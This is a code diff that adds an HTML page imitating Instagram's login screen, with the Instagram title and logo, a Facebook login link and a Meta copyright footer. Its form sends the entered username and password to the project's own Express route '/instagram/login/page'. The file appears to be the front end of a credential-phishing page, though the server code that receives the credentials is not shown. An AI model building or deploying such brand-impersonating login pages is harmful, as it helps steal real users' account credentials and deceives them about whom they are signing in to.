@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Instagram</title>
+
+    <!-- Google font for logo -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Your CSS (put instagram.css in public/ and serve with express.static) -->
+    <link rel="stylesheet" href="/instagram.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="login-card">
+        <h1 class="logo">Instagram</h1>
+
+        <!-- FORM: make sure action matches your server route -->
+        <form class="login-form" action="/instagram/login/page" method="POST">
+          <input
+            type="text"
+            name="username"
+            placeholder="Phone number, username, or email"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+          />
+          <button type="submit">Log in</button>
+        </form>
+
+        <div class="or-block">
+          <div class="line"></div>
+          <p>OR</p>
+          <div class="line"></div>
+        </div>
+
+        <div class="facebook-login">
+          <img
+            src="https://cdn-icons-png.flaticon.com/512/124/124010.png"
+            alt="fb"
+          />
+          <a href="#">Log in with Facebook</a>
+        </div>
+
+        <a class="forgot" href="#">Forgot password?</a>
+      </div>
+
+      <div class="register-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+    </div>
+
+    <footer>
+      <p>English ▾</p>
+      <p>© 2025 Instagram from Meta</p>
+    </footer>
+  </body>
+</html>
